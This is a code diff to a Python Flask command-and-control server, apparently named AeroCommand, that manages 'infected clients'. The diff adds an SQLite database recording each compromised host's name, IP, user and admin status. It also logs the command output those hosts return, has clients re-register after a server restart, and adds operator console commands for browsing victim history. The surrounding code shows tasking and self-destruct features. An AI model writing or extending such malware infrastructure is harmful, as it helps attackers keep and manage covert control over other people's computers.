@@ -5,6 +5,7 @@ import base64
 import os
 import time
 import json
+import sqlite3
 from datetime import datetime
 
 # Suppress Flask logging
@@ -13,6 +14,75 @@ log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
 app.logger.setLevel(logging.ERROR)
+
+DB_FILE = "aerocommand.db"
+
+def init_db():
+    """Initialize SQLite database for storing clients, commands, and logs"""
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS clients (
+                client_id TEXT PRIMARY KEY,
+                host TEXT,
+                ip TEXT,
+                pid INTEGER,
+                os TEXT,
+                user TEXT,
+                admin INTEGER,
+                first_seen TEXT,
+                last_seen TEXT,
+                status TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS command_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                client_id TEXT,
+                command TEXT,
+                output TEXT,
+                timestamp TEXT
+            )
+        """)
+        conn.commit()
+
+def db_save_client(info):
+    """Save or update client registration in SQLite"""
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
+            ON CONFLICT(client_id) DO UPDATE SET
+                pid=excluded.pid,
+                last_seen=excluded.last_seen,
+                status='ALIVE'
+        """, (
+            info['client_id'],
+            info.get('host', 'unknown'),
+            info.get('ip', 'unknown'),
+            info.get('pid', 0),
+            info.get('os', 'Unknown'),
+            info.get('user', 'unknown'),
+            1 if info.get('admin') else 0,
+            now,
+            now
+        ))
+        conn.commit()
+
+def db_log_command(client_id, command, output):
+    """Log executed command output into SQLite"""
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO command_logs (client_id, command, output, timestamp)
+            VALUES (?, ?, ?, ?)
+        """, (client_id, command, output, now))
+        conn.commit()
+
+init_db()
 
 pending_commands = {}
 infected_clients = {}
@@ -111,6 +181,7 @@ def register():
             'registered': now.strftime("%H:%M:%S"),
             'last_seen': now,
         }
+        db_save_client(info)
 
     if is_new:
         admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""
@@ -131,8 +202,11 @@ def get_command():
 
     # Update heartbeat
     with cmd_lock:
-        if client_id in infected_clients:
-            infected_clients[client_id]['last_seen'] = datetime.now()
+        if client_id not in infected_clients:
+            # Unknown client — server was restarted, tell client to re-register
+            return encrypt_response({"action": "re-register"}), 200
+
+        infected_clients[client_id]['last_seen'] = datetime.now()
 
         if client_id in pending_commands and pending_commands[client_id]:
             cmd = pending_commands[client_id].pop(0)
@@ -160,6 +234,7 @@ def post_result():
     print(f"\n{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET}")
     print(output)
     results.append({"client": client_id, "output": output, "time": timestamp})
+    db_log_command(client_id, "COMMAND_RESULT", output)
     print(PROMPT, end="", flush=True)
     return "OK", 200
 
@@ -246,7 +321,9 @@ def show_help():
   {C.CYAN}Danger Zone:{C.RESET}
   {C.RED}kill{C.RESET}              Self-destruct client (removes & deletes)
 
-  {C.CYAN}Server:{C.RESET}
+  {C.CYAN}Server & Database:{C.RESET}
+  {C.GREEN}db clients{C.RESET}         Show historical registered clients from database
+  {C.GREEN}db logs [limit]{C.RESET}    Show command logs stored in database
   {C.GREEN}help{C.RESET}              Show this help menu
   {C.GREEN}clear{C.RESET}             Clear screen
   {C.GREEN}exit{C.RESET}              Quit the server 
@@ -334,6 +411,35 @@ def input_thread_func():
 
             elif cmd.lower() == "list":
                 show_clients()
+
+            elif cmd.lower() == "db clients":
+                with sqlite3.connect(DB_FILE) as conn:
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT client_id, host, ip, pid, user, first_seen, last_seen, status FROM clients")
+                    rows = cursor.fetchall()
+                    if not rows:
+                        print(f"\n{C.YELLOW}[!] No database client records found{C.RESET}")
+                    else:
+                        print(f"\n{C.BOLD}{'='*90}\n  DATABASE CLIENT HISTORY\n{'='*90}{C.RESET}")
+                        for r in rows:
+                            print(f"  ID: {r[0]} | Host: {r[1]} ({r[2]}) | PID: {r[3]} | User: {r[4]} | First: {r[5]} | Last: {r[6]} | Status: {r[7]}")
+                        print(f"{'='*90}\n")
+
+            elif cmd.lower().startswith("db logs"):
+                parts = cmd.split()
+                limit = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 10
+                with sqlite3.connect(DB_FILE) as conn:
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT id, client_id, timestamp, output FROM command_logs ORDER BY id DESC LIMIT ?", (limit,))
+                    rows = cursor.fetchall()
+                    if not rows:
+                        print(f"\n{C.YELLOW}[!] No database logs found{C.RESET}")
+                    else:
+                        print(f"\n{C.BOLD}{'='*90}\n  RECENT DB COMMAND LOGS (Last {limit})\n{'='*90}{C.RESET}")
+                        for r in rows:
+                            snippet = r[3].replace("\n", " ")[:60]
+                            print(f"  [{r[0]}] {r[2]} | Client: {r[1]} | {snippet}...")
+                        print(f"{'='*90}\n")
 
             elif cmd.lower().startswith("target"):
                 parts = cmd.split()
